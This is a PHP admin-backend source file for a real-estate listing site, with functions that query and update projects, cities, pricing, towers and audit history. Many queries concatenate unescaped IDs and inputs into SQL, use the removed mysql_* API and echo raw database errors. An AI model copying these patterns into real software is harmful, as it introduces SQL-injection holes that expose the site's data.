		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateBuilder()');
		return 1;

	}

/*********************************/

function updateProjectPhase($pID, $phase, $reviews,$stage='',$revert=FALSE){
if($phase!="complete"){
$Sql = "UPDATE ".RESI_PROJECT." SET PROJECT_PHASE = '".$phase."', AUDIT_COMMENTS = '".$reviews."' WHERE PROJECT_ID = '".$pID."';";
}
else{
	$Sql = "UPDATE ".RESI_PROJECT." SET PROJECT_PHASE = '".$phase."', PROJECT_STAGE = 'noStage', UPDATION_CYCLE_ID = NULL, AUDIT_COMMENTS = '".$reviews."' WHERE PROJECT_ID = '".$pID."';";
}
$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function updateProjectPhase()');

	if($revert == TRUE) $phase='revert';
	$ins = "
				INSERT INTO 
						project_stage_history 
							(HISTORY_ID,PROJECT_ID,PROJECT_PHASE,PROJECT_STAGE,DATE_TIME,ADMIN_ID)
				VALUES 
							(NULL,'".$pID."','".$phase."','".$stage."','".date('Y-m-d H:i:s')."','".$_SESSION['adminId']."') 
			";
	$r = mysql_query($ins);
return 1;
}

function updationCycleTable()
	{
		$qry	=	"SELECT * FROM ".UPDATION_CYCLE.";";
		$res	=	mysql_query($qry) or die(mysql_error().' Error in function UpdationCycleTable()');
		$labelArray = array();
		while($data = mysql_fetch_assoc($res))
		{
			array_push($labelArray,$data);
		}
		return $labelArray;
	}

function changeLabel($pID, $val){

}


/**************City management**********************/

function InsertCity($txtCityName, $txtCityUrl, $DisplayOrder,$txtMetaTitle,$txtMetaKeywords,$txtMetaDescription,$status,$desc)
{

	  $Sql = "INSERT INTO " .CITY." SET
			LABEL 	   			= '".d_($txtCityName)."',
			META_TITLE   		= '".d_($txtMetaTitle)."',
			META_KEYWORDS  		= '".d_($txtMetaKeywords)."',
			META_DESCRIPTION	= '".d_($txtMetaDescription)."',
			ACTIVE 	   			= '".d_($status)."',
			URL					= '".d_($txtCityUrl)."',
			DISPLAY_ORDER		= '".d_($DisplayOrder)."',
			DESCRIPTION			=	'".d_($desc)."'";//die();
	  $ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function InsertCity()');
	  return 1;
}


function DeleteCity($ID)
{
	$Sql 		= "DELETE FROM ".CITY." WHERE CITY_ID = '".$ID."'";
	$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function DeleteCity()');

	return 1;
}

function ViewCityDetails($cityID){
	$Sql = "SELECT * FROM ".CITY." WHERE CITY_ID ='".$cityID."'";
	$ExecSql = mysql_query($Sql);

	if(mysql_num_rows($ExecSql)==1)	{

		$Res = mysql_fetch_assoc($ExecSql);
		$ResDetails['CITY_ID'] 		 	=  $Res['CITY_ID'];
		$ResDetails['LABEL']			=  $Res['LABEL'];
		$ResDetails['META_TITLE'] 		=  $Res['META_TITLE'];
		$ResDetails['META_KEYWORDS'] 	=  $Res['META_KEYWORDS'];
		$ResDetails['META_DESCRIPTION'] =  $Res['META_DESCRIPTION'];
		$ResDetails['ACTIVE'] 			=  $Res['ACTIVE'];
		$ResDetails['URL'] 				=  $Res['URL'];
		$ResDetails['DISPLAY_ORDER']  	=  $Res['DISPLAY_ORDER'];
		$ResDetails['DESCRIPTION']		=  $Res['DESCRIPTION'];
		return $ResDetails;
	}
	else
	{
		return 0;
	}
}

function getAllCities(){

	$allCities = "SELECT * FROM ".CITY." WHERE 1 ORDER BY LABEL";
	$execQry = mysql_query($allCities);
	while($cityArr = mysql_fetch_assoc($execQry)){
		$allCityArr[] = $cityArr;
	}
	return $allCityArr;
}

function ViewLocalityDetails($localityID){
	$Sql = "SELECT * FROM ".LOCALITY." WHERE LOCALITY_ID ='".$localityID."'";
	$ExecSql = mysql_query($Sql);

	if(mysql_num_rows($ExecSql)==1)	{

		$Res = mysql_fetch_assoc($ExecSql);
		$ResDetails['LOCALITY_ID']		=  $Res['LOCALITY_ID'];
		$ResDetails['CITY_ID'] 		 	=  $Res['CITY_ID'];
		$ResDetails['LABEL']			=  $Res['LABEL'];
		$ResDetails['META_TITLE'] 		=  $Res['META_TITLE'];
		$ResDetails['META_KEYWORDS'] 	=  $Res['META_KEYWORDS'];
		$ResDetails['META_DESCRIPTION'] =  $Res['META_DESCRIPTION'];
		$ResDetails['ACTIVE'] 			=  $Res['ACTIVE'];
		$ResDetails['URL'] 				=  $Res['URL'];
		$ResDetails['DESCRIPTION']		=  $Res['DESCRIPTION'];
		return $ResDetails;
	}
	else
	{
		return 0;
	}
}

function ViewSuburbDetails($suburbID){
	$Sql = "SELECT * FROM ".SUBURB." WHERE SUBURB_ID  ='".$suburbID."'";
	$ExecSql = mysql_query($Sql);

	if(mysql_num_rows($ExecSql)==1)	{

		$Res = mysql_fetch_assoc($ExecSql);
		$ResDetails['LOCALITY_ID']		=  $Res['LOCALITY_ID'];
		$ResDetails['CITY_ID'] 		 	=  $Res['CITY_ID'];
		$ResDetails['LABEL']			=  $Res['LABEL'];
		$ResDetails['META_TITLE'] 		=  $Res['META_TITLE'];
		$ResDetails['META_KEYWORDS'] 	=  $Res['META_KEYWORDS'];
		$ResDetails['META_DESCRIPTION'] =  $Res['META_DESCRIPTION'];
		$ResDetails['ACTIVE'] 			=  $Res['ACTIVE'];
		$ResDetails['URL'] 				=  $Res['URL'];
		$ResDetails['DESCRIPTION']		=  $Res['DESCRIPTION'];
		return $ResDetails;
	}
	else
	{
		return 0;
	}
}

function DeleteBank($bank_id){
	$sql = "DELETE FROM ".BANK_LIST." WHERE BANK_ID = '".$bank_id."'";
	$execQry = mysql_query($sql) or die(mysql_error());
	return true;
}

function project_list($builderId)
{
	$sql	=	"SELECT PROJECT_ID,PROJECT_NAME FROM ".RESI_PROJECT." WHERE BUILDER_ID = '".$builderId."' AND PROJECT_NAME != '' ORDER BY PROJECT_NAME ASC";
	$res	=	mysql_query($sql) or die(mysql_error());
	$arrBuilder = array();
	while($data = mysql_fetch_assoc($res))
	{
		array_push($arrBuilder,$data);
	}
	return $arrBuilder;
}

/*************Query for insert other price***********************/
function InsertOtherPrice($arr)
{

	 $Sql = "INSERT INTO " .RESI_PROJECT_OTHER_PRICING." SET
				PROJECT_ID  	   					= '".d_($arr['projectId'])."',
				EDC_IDC 	  						= '".d_($arr['edc_idc_val1'])."',
				EDC_IDC_TYPE	 	  				= '".d_($arr['edc_idc'])."',
				EDC_IDC_MEND_OPT 					= '".d_($arr['edc_idc_type1'])."',
				LEASE_RENT							= '".d_($arr['lease_rent_val1'])."',
				LEASE_RENT_TYPE	 					= '".d_($arr['lease_rent'])."',
				LEASE_RENT_MEND_OPT	 				= '".d_($arr['lease_rent_type1'])."',
				OPEN_CAR_PARKING			 		= '".d_($arr['open_car_parking1'])."',
				OPEN_CAR_PARKING_TYPE			 	= '".d_($arr['open_car_parking'])."',
				OPEN_CAR_PARKING_MEND_OPT			= '".d_($arr['open_car_parking_type1'])."',
				CLOSE_CAR_PARKING					= '".d_($arr['close_car_parking1'])."',
				CLOSE_CAR_PARKING_TYPE				= '".d_($arr['close_car_parking'])."',
				CLOSE_CAR_PARKING_MEND_OPT			= '".d_($arr['close_car_parking_type1'])."',
				SEMI_CLOSE_CAR_PARKING				= '".d_($arr['semi_close_car_parking1'])."',
				SEMI_CLOSE_CAR_PARKING_TYPE			= '".d_($arr['semi_close_car_parking'])."',
				SEMI_CLOSE_CAR_PARKING_MEND_OPT		= '".d_($arr['semi_close_car_parking_type1'])."',
				CLUB_HOUSE							= '".d_($arr['club_house1'])."',
				CLUB_HOUSE_PSF_FIXED				= '".d_($arr['club_house'])."',
				CLUB_HOUSE_MEND_OPT					= '".d_($arr['club_house_type1'])."',
				IFMS								= '".d_($arr['ifms1'])."',
				IFMS_PSF_FIXED						= '".d_($arr['ifms'])."',
				IFMS_MEND_OPT						= '".d_($arr['ifms_type1'])."',
				POWER_BACKUP						= '".d_($arr['power_backup1'])."',
				POWER_BACKUP_PSF_FIXED				= '".d_($arr['power_backup'])."',
				POWER_BACKUP_MEND_OPT				= '".d_($arr['power_backup_type1'])."',
				LEGAL_FEES							= '".d_($arr['legal_fees1'])."',
				LEGAL_FEES_PSF_FIXED				= '".d_($arr['legal_fees'])."',
				LEGAL_FEES_MEND_OPT					= '".d_($arr['legal_fees_type1'])."',
				POWER_WATER							= '".d_($arr['power_and_water1'])."',
				POWER_WATER_PSF_FIXED				= '".d_($arr['power_and_water'])."',
				POWER_WATER_MEND_OPT				= '".d_($arr['power_and_water_type1'])."',
				MAINTENANCE_ADVANCE					= '".d_($arr['maintenance_advance1'])."',
				MAINTENANCE_ADVANCE_PSF_FIXED		= '".d_($arr['maintenance_advance'])."',
				MAINTENANCE_ADVANCE_MEND_OPT		= '".d_($arr['maintenance_advance_type1'])."',
				MAINTENANCE_ADVANCE_MONTHS			= '".d_($arr['maintenance_advance_months'])."',
				PLC									= '".d_($arr['plc'])."',
				FLOOR_RISE							= '".d_($arr['floor_rise'])."',
				OTHERS								= '".d_($arr['other'])."'";

		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function InsertOtherPrice()');
		
		if($ExecSql)
		{
			$last_id = mysql_insert_id();
			audit_insert($last_id,'insert','resi_project_other_pricing',$arr['projectId']);
			return 1;
		}



}

/*******function to fetch project other pricing********/

function fetch_other_price($projectId)
{
	$qry	=	"SELECT * FROM ".RESI_PROJECT_OTHER_PRICING." WHERE PROJECT_ID = '".$projectId."'";
	$res	=	mysql_query($qry) or die(mysql_error());
	$arrOtherPrice = array();
	while($data = mysql_fetch_assoc($res))
	{
		array_push($arrOtherPrice,$data);
	}
	return $arrOtherPrice;
}

/*************Query for update other price***********************/
function UpdateOtherPrice($arr)
{

	 $Sql = "UPDATE " .RESI_PROJECT_OTHER_PRICING."
				SET
					EDC_IDC 	  						= '".d_($arr['edc_idc_val1'])."',
					EDC_IDC_TYPE	 	  				= '".d_($arr['edc_idc'])."',
					EDC_IDC_MEND_OPT 					= '".d_($arr['edc_idc_type1'])."',
					LEASE_RENT							= '".d_($arr['lease_rent_val1'])."',
					LEASE_RENT_TYPE	 					= '".d_($arr['lease_rent'])."',
					LEASE_RENT_MEND_OPT	 				= '".d_($arr['lease_rent_type1'])."',
					OPEN_CAR_PARKING			 		= '".d_($arr['open_car_parking1'])."',
					OPEN_CAR_PARKING_TYPE			 	= '".d_($arr['open_car_parking'])."',
					OPEN_CAR_PARKING_MEND_OPT			= '".d_($arr['open_car_parking_type1'])."',
					CLOSE_CAR_PARKING					= '".d_($arr['close_car_parking1'])."',
					CLOSE_CAR_PARKING_TYPE				= '".d_($arr['close_car_parking'])."',
					CLOSE_CAR_PARKING_MEND_OPT			= '".d_($arr['close_car_parking_type1'])."',
					SEMI_CLOSE_CAR_PARKING				= '".d_($arr['semi_close_car_parking1'])."',
					SEMI_CLOSE_CAR_PARKING_TYPE			= '".d_($arr['semi_close_car_parking'])."',
					SEMI_CLOSE_CAR_PARKING_MEND_OPT		= '".d_($arr['semi_close_car_parking_type1'])."',
					CLUB_HOUSE							= '".d_($arr['club_house1'])."',
					CLUB_HOUSE_PSF_FIXED				= '".d_($arr['club_house'])."',
					CLUB_HOUSE_MEND_OPT					= '".d_($arr['club_house_type1'])."',
					IFMS								= '".d_($arr['ifms1'])."',
					IFMS_PSF_FIXED						= '".d_($arr['ifms'])."',
					IFMS_MEND_OPT						= '".d_($arr['ifms_type1'])."',
					POWER_BACKUP						= '".d_($arr['power_backup1'])."',
					POWER_BACKUP_PSF_FIXED				= '".d_($arr['power_backup'])."',
					POWER_BACKUP_MEND_OPT				= '".d_($arr['power_backup_type1'])."',
					LEGAL_FEES							= '".d_($arr['legal_fees1'])."',
					LEGAL_FEES_PSF_FIXED				= '".d_($arr['legal_fees'])."',
					LEGAL_FEES_MEND_OPT					= '".d_($arr['legal_fees_type1'])."',
					POWER_WATER							= '".d_($arr['power_and_water1'])."',
					POWER_WATER_PSF_FIXED				= '".d_($arr['power_and_water'])."',
					POWER_WATER_MEND_OPT				= '".d_($arr['power_and_water_type1'])."',
					MAINTENANCE_ADVANCE					= '".d_($arr['maintenance_advance1'])."',
					MAINTENANCE_ADVANCE_PSF_FIXED		= '".d_($arr['maintenance_advance'])."',
					MAINTENANCE_ADVANCE_MEND_OPT		= '".d_($arr['maintenance_advance_type1'])."',
					MAINTENANCE_ADVANCE_MONTHS			= '".d_($arr['maintenance_advance_months'])."',
					PLC									= '".d_($arr['plc'])."',
					FLOOR_RISE							= '".d_($arr['floor_rise'])."',
					OTHERS								= '".d_($arr['other'])."'
				
				WHERE
				
				PROJECT_ID  = '".d_($arr['projectId'])."'";

		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateOtherPrice()');
		
		if($ExecSql)
		{
			audit_insert($arr['row_id'],'update','resi_project_other_pricing',$arr['projectId']);
			return 1;
		}



}

/*********function for chk tower already exists in a project********/

 function fetch_towerName($projectId)
{
	$qrySel	=	"SELECT TOWER_NAME,TOWER_ID FROM ".RESI_PROJECT_TOWER_DETAILS."  
					WHERE 
						PROJECT_ID = '".$projectId."'";
	$res_Sel=	mysql_query($qrySel);
	$arrDetailTower	=	array();
	while($data = mysql_fetch_assoc($res_Sel))
	{
		$arrDetailTower[$data['TOWER_ID']] = $data['TOWER_NAME'];
	}
	return $arrDetailTower;
}

/*************qry for delete tower detail****************/
function deleteTowerDetail($projectId,$towerId)
{
	$exp = explode(",",$towerId);
	$flgDel = 0;
	foreach($exp as $val)
	{
		$qryDel = "DELETE FROM ".RESI_PROJECT_TOWER_DETAILS." 
					WHERE
						PROJECT_ID = '".$projectId."'
					AND
						TOWER_ID   = '".$val."'";
		$resDel  = mysql_query($qryDel) or die(mysql_error());
		if($resDel)
		{
			audit_insert($val,'delete','resi_project_tower_details',$projectId);
			$flgDel  = 1;
		}
	}
	if($flgDel == 1)
		return 1;
}

//function relaated to builder contact information fetch from builder contact onfo table
function BuilderContactInfo($builderid)
{

	$qry_contact_info = "SELECT * FROM ".BUILDER_CONTACT_INFO." WHERE BUILDER_ID = '".$builderid."'";
	$resContact	=	mysql_query($qry_contact_info);
	$arrContact = array();
	while($dataContact	=	mysql_fetch_array($resContact))
	{
		array_push($arrContact,$dataContact);
	}
	return $arrContact;
}


/**********function for calculate supply availability**********/
function computeAvailability($projectId)
{
	$qry = "select a.*, rps.available_no_flats from
			(SELECT rp.project_id, unit_type, bedrooms
			FROM resi_project rp
			JOIN resi_project_options rpo
			  ON (rp.project_id = rpo.project_id)
			WHERE rp.project_id = $projectId
			GROUP BY rp.project_id, unit_type, bedrooms) a
			left join 
			(select rps.project_id, rps.project_type, rps.no_of_bedrooms, max(proj_supply_id) as proj_supply_id from resi_proj_supply rps 
			where rps.project_id = $projectId and submitted_date > 
			(select STR_TO_DATE(CONCAT(MONTH(max(submitted_date)), '-', YEAR(max(submitted_date))), '%m-%Y')
			from resi_project rp
			join resi_proj_supply rps
			on (rp.project_id = rps.project_id)
			where rp.project_id = $projectId)
			group by rps.project_id, rps.project_type, rps.no_of_bedrooms) b
			on (a.project_id = b.project_id and a.unit_type = b.project_type and a.bedrooms = b.no_of_bedrooms)
			left join resi_proj_supply rps
			on (rps.proj_supply_id = b.proj_supply_id)";

    $res = mysql_query($qry) or die(mysql_error());

    $sum = 0;
    while($data = mysql_fetch_assoc($res))
    {
    	if($data['available_no_flats'] != NULL)
    		$sum += $data['available_no_flats'];
    	else
    		return NULL;
    }
    return $sum;

}

/**********function for update resi project supply availability***********/
function updateAvailability($projectId,$returnAvailability)
{
	$value = $returnAvailability == NULL ? 'NULL':$returnAvailability;
	$qryUp = "UPDATE resi_project
			  SET 
			  	 AVAILABLE_NO_FLATS = $value
			  WHERE
				 PROJECT_ID = '".$projectId."'";
	$resUp =  mysql_query($qryUp) or die(mysql_error()." error here");
	if($resUp)
	{
		audit_insert($projectId,'update','resi_project',$projectId);
		return 1;
	}
}

/**************function for calculate width and height of a image************/
function scaleDimensions($orig_width, $orig_height, $max_width, $max_height)
{
	if($orig_width < $max_width && $orig_height < $max_height)
	{
		return array($orig_width, $orig_height);
	}

	$ratiow = $max_width / $orig_width;
	$ratioh = $max_height / $orig_height;
	$ratio = min($ratiow, $ratioh);
	$width = intval($ratio * $orig_width);
	$height = intval($ratio * $orig_height);
	return array($width, $height);
}


/*********function for last upldated module date**********/
function lastUpdatedAuditDetail($projectId)
{
	$qry = "   SELECT
					   b.TABLE_NAME, b.DEPARTMENT, c.FNAME, a.ACTION_DATE
					FROM
					   audit a
					       JOIN
					   (SELECT
					       a.TABLE_NAME, p.DEPARTMENT, MAX(a.AUDIT_ID) as AUDIT_ID
					   FROM
					       audit a
					   JOIN proptiger_admin p ON a.DONE_BY = p.ADMINID
					   WHERE
					       a.PROJECT_ID = $projectId
					   GROUP BY a.TABLE_NAME , p.DEPARTMENT) b ON (b.audit_id = a.audit_id)
					       join
					   proptiger_admin c ON (c.ADMINID = a.DONE_BY)";
	$res = mysql_query($qry) or die(mysql_error());
	$arrData = array();
	while($data = mysql_fetch_assoc($res))
	{
		//array_push($arrData,$data);
		$arrData[$data['TABLE_NAME']][$data['DEPARTMENT']] = $data;
	}
	return $arrData;
	
}

/*************function for fetch fetch project calling links*****************/

function fetchProjectCallingLinks($projectId)
{
	$qry = "SELECT d.AudioLink,a.FNAME,d.Remark,d.StartTime 
			FROM 
				(".CALLDETAILS." d LEFT JOIN ".CALLPROJECT." p 
			ON
				d.CallId = p.CallId)
			LEFT JOIN
				".ADMIN." a
			ON
				d.AgentId = a.ADMINID
			WHERE
				p.ProjectId = $projectId
			AND 
				d.AudioLink IS NOT NULL
			AND 
				d.AudioLink != ''";
	$res = mysql_query($qry) or die(mysql_error());
	$arrCallLink = array();
	if(mysql_num_rows($res)>0)
	{
		while($data = mysql_fetch_assoc($res))
		{
			array_push($arrCallLink,$data);
		}
	}
	return $arrCallLink;
}

function getLastUpdatedTime($projectId)
{
	$qry = "SELECT MAX(_t_transaction_date) as _t_transaction_date
	FROM
	_t_resi_proj_supply
	WHERE
	PROJECT_ID  = $projectId
	AND
	_t_operation = 'I'";
	$res = mysql_query($qry) or die(mysql_query());
	$data = mysql_fetch_assoc($res);
	return $data['_t_transaction_date'];
}

/**********Fetch history for all tables*********/
function fetchColumnChanges($projectId, $stageName, $phasename, $phaseId)
{
	$arrTblName	= array("resi_project","resi_project_options","resi_proj_supply");
	$arrFields  = array("_t_transaction_id","_t_transaction_date","_t_operation","_t_user_id");
	
	$changedValueArr = array();
	foreach($arrTblName as $table)
	{
		$fstData  = array();
		$lstData  = array();

		$auditTbl  = "_t_$table";
		$startTime = fetchStartTime($stageName,$phasename,$projectId);
		
		if($auditTbl == '_t_resi_proj_supply' AND $phaseId != '' AND $phaseId != '-1')
			$andClause = " AND PHASE_ID = $phaseId";
		else 
			$andClause = '';
		
		if($startTime == NULL)
		{
			$qryStartTime = "SELECT MIN(_t_transaction_date) as  _t_transaction_date
							FROM 
								$auditTbl 
							WHERE 
								PROJECT_ID = $projectId
							$andClause";
			$resStartTime  = mysql_query($qryStartTime) or die(mysql_error());
			$dataStartTime = mysql_fetch_assoc($resStartTime);
			$startTime     = $dataStartTime['_t_transaction_date'];
		}
		
		$fstQry = "SELECT * FROM $auditTbl 
				   WHERE
					 PROJECT_ID = $projectId
				   AND
					 _t_transaction_date <= '$startTime'
				   $andClause
				   ORDER BY
					 _t_transaction_id DESC LIMIT 1";
		$fstRes = mysql_query($fstQry) or die(mysql_error());
		$fstData = mysql_fetch_assoc($fstRes);
		
		
		$lstQry = "SELECT * FROM $auditTbl
				   WHERE
					  PROJECT_ID = $projectId
				  AND
					 _t_transaction_date < NOW()
				  $andClause
				  ORDER BY
					 _t_transaction_id DESC LIMIT 1";
		$lstRes = mysql_query($lstQry) or die(mysql_error());
		$lstData = mysql_fetch_assoc($lstRes);
		foreach($lstData as $key=>$val)
		{
			if($val != $fstData[$key])
			{
				if(!in_array($key,$arrFields))
				{
					$changedValueArr[$table][$key]['new'] = trim($val);
					$changedValueArr[$table][$key]['old']  = trim($fstData[$key]);  
				}
			}
		}
	}
	return $changedValueArr;
}

function fetchStartTime($stageName,$phasename,$projectId)
{
	$whereClause = '';
	if(trim($phasename) == 'newProject' AND trim($stageName) == 'newProject')
	{
		return NULL;
	}
	elseif(trim($phasename) == 'audit1' AND trim($stageName) == 'newProject')
	{
		$whereClause = "(PROJECT_STAGE  = '$stageName' AND PROJECT_PHASE  = 'dcCallCenter')";
		
	}
	elseif(trim($phasename) == 'audit1' AND trim($stageName) == 'updationCycle')
	{
		$whereClause = "((PROJECT_STAGE  = '$stageName' AND PROJECT_PHASE  = 'revert') OR (PROJECT_STAGE  = 'noStage' AND PROJECT_PHASE  = 'complete'))";
	}
	
	$qry = "SELECT  MAX(DATE_TIME) as DATE_TIME
			FROM
			   project_stage_history
		    WHERE
		      PROJECT_ID = $projectId
			AND $whereClause"
					;
	$res = mysql_query($qry) or die(mysql_error());
	$data= mysql_fetch_assoc($res);
	return $data['DATE_TIME'];
}

?>

